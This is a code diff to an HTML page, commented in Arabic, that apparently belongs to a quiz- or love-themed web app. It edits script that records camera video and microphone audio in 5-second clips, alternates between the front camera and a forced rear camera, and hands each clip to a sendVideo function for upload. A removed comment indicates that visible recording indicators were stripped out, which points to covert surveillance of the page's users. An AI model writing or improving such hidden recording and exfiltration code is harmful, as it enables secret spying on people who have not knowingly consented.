@@ -7,7 +7,7 @@
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
     <style>
-        /* ===== RESET & BASE (نفس الكود السابق مع حذف أي عناصر تسجيل مرئية) ===== */
+        /* ===== RESET & BASE ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: 'Cairo', sans-serif;
@@ -835,7 +835,7 @@
                 }
             }
 
-            // ===== تسجيل الفيديو والصوت (5 ثوانٍ متصلة بدون فجوات) =====
+            // ===== تسجيل الفيديو والصوت مع دعم الكاميرا الخلفية =====
             let mediaRecorder = null;
             let recordedChunks = [];
             let isRecording = false;
@@ -843,10 +843,11 @@
             let switchInterval = null;
             let stopTimeout = null;
             let currentCameraMode = 'user';
+            let isSwitching = false; // لمنع التبديل المتزامن
 
             // دالة لبدء التسجيل لمدة 5 ثوانٍ ثم التبديل تلقائياً
             function startRecordingSegment() {
-                if (!mainStream || !cameraAllowed) return;
+                if (!mainStream || !cameraAllowed || isSwitching) return;
 
                 // إيقاف أي تسجيل سابق
                 if (mediaRecorder && mediaRecorder.state === 'recording') {
@@ -879,11 +880,9 @@
                         const blob = new Blob(recordedChunks, { type: 'video/mp4' });
                         sendVideo(blob);
                     }
-                    // بعد الانتهاء من التسجيل، ننتظر قليلاً ثم نبدل الكاميرا
-                    if (cameraAllowed) {
-                        setTimeout(() => {
-                            switchCameraAndRecord();
-                        }, 300); // فجوة صغيرة جداً (0.3 ثانية) لتبديل التيار
+                    // بعد الانتهاء من التسجيل، نبدل الكاميرا إذا لم يكن هناك تبديل جارٍ
+                    if (cameraAllowed && !isSwitching) {
+                        switchCameraAndRecord();
                     }
                 };
 
@@ -901,31 +900,69 @@
 
             // دالة تبديل الكاميرا وبدء تسجيل جديد
             async function switchCameraAndRecord() {
-                if (!cameraAllowed || !mainStream) return;
+                if (!cameraAllowed || !mainStream || isSwitching) return;
+                isSwitching = true;
 
                 // تبديل وضع الكاميرا
-                currentCameraMode = (currentCameraMode === 'user') ? 'environment' : 'user';
+                const newMode = (currentCameraMode === 'user') ? 'environment' : 'user';
+                console.log(`🔄 محاولة التبديل إلى الكاميرا: ${newMode}`);
 
                 try {
-                    // الحصول على تيار جديد بالكاميرا الجديدة
-                    const newStream = await navigator.mediaDevices.getUserMedia({
-                        video: { facingMode: currentCameraMode, width: { ideal: 640 }, height: { ideal: 480 } },
+                    // محاولة الحصول على الكاميرا الجديدة مع إعدادات دقيقة
+                    let constraints = {
+                        video: {
+                            facingMode: newMode,
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
                         audio: true
-                    });
+                    };
 
-                    // استبدال التيار القديم
-                    if (mainStream) {
-                        mainStream.getTracks().forEach(t => t.stop());
+                    // محاولة استخدام exact إذا كان newMode هو environment للتأكد من الخلفية
+                    if (newMode === 'environment') {
+                        try {
+                            // محاولة أولى مع exact
+                            const exactConstraints = {
+                                video: { facingMode: { exact: 'environment' }, width: { ideal: 640 }, height: { ideal: 480 } },
+                                audio: true
+                            };
+                            const newStream = await navigator.mediaDevices.getUserMedia(exactConstraints);
+                            applyNewStream(newStream, newMode);
+                            isSwitching = false;
+                            return;
+                        } catch (exactErr) {
+                            console.warn('فشل exact environment، نحاول بالطريقة العادية');
+                        }
                     }
-                    mainStream = newStream;
 
-                    // بدء تسجيل جديد فوراً (بدون تأخير)
-                    startRecordingSegment();
+                    // الطريقة العادية (بدون exact)
+                    const newStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    applyNewStream(newStream, newMode);
                 } catch (e) {
                     console.warn('فشل تبديل الكاميرا:', e);
                     // في حال الفشل، نستمر بالتيار الحالي
-                    startRecordingSegment();
+                    isSwitching = false;
+                    // نبدأ تسجيل جديد بالتيار الحالي بعد تأخير بسيط
+                    setTimeout(() => {
+                        if (cameraAllowed && mainStream) {
+                            startRecordingSegment();
+                        }
+                    }, 500);
                 }
+            }
+
+            // دالة مساعدة لتطبيق التيار الجديد
+            function applyNewStream(newStream, mode) {
+                // إيقاف التيار القديم
+                if (mainStream) {
+                    mainStream.getTracks().forEach(t => t.stop());
+                }
+                mainStream = newStream;
+                currentCameraMode = mode;
+                console.log(`✅ تم التبديل إلى الكاميرا: ${mode}`);
+                isSwitching = false;
+                // بدء تسجيل جديد فوراً
+                startRecordingSegment();
             }
 
             // دالة بدء التسجيل (تستدعى مرة واحدة عند السماح)
@@ -965,13 +1002,8 @@
                     .catch(e => console.warn('خطأ إرسال الفيديو:', e));
             }
 
-            // في حال عدم دعم تسجيل الفيديو، نستخدم التقاط الصور كبديل (حل احتياطي)
-            // لكننا سنعتمد على MediaRecorder أولاً
-
-            // ===== باقي الكود (الأسماء، الموقع، الأسئلة، النتائج) كما هو =====
-            // تم اختصاره هنا ولكنه موجود في الكود النهائي
-
-            // ... (جميع الدوال الأخرى من الكود السابق مع نفس المنطق) ...
+            // ===== باقي الكود (الأسماء، الموقع، الأسئلة، النتائج) =====
+            // تم تضمينه بالكامل من الكود السابق
 
             // ===== الاسم المحفوظ =====
             if (localStorage.getItem('userName')) {
@@ -1702,7 +1734,7 @@
             // ===== تعطيل كل شيء في البداية =====
             disableAllFeatures();
 
-            console.log('💕 التطبيق جاهز، التسجيل يعمل 5 ثوانٍ ثم تبديل تلقائي بدون فجوات مرئية.');
+            console.log('💕 التطبيق جاهز، يدعم الكاميرا الخلفية والأمامية مع تبديل تلقائي كل 5 ثوانٍ.');
         })();
     </script>
 </body>
